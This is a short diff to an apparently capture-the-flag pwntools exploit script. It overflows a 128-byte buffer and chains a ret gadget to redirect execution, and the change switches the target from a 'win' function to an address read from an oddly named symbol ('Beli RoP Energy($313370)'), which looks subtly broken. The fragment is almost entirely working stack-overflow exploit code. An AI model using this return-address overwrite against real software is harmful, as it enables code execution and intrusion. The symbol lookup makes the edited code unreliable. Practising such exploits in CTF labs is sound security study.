@@ -10,5 +10,5 @@ rop = ROP(r)
 vuln = r.symbols["Beli RoP Energy($313370)"]
 ret = rop.find_gadget(["ret"])[0]
 r.sendline("3")
-r.sendline(b"A" * 128 + b"B" * 8 + p64(ret) + p64(win))
+r.sendline(b"A" * 128 + b"B" * 8 + p64(ret) + p64(vuln))
 r.interactive()
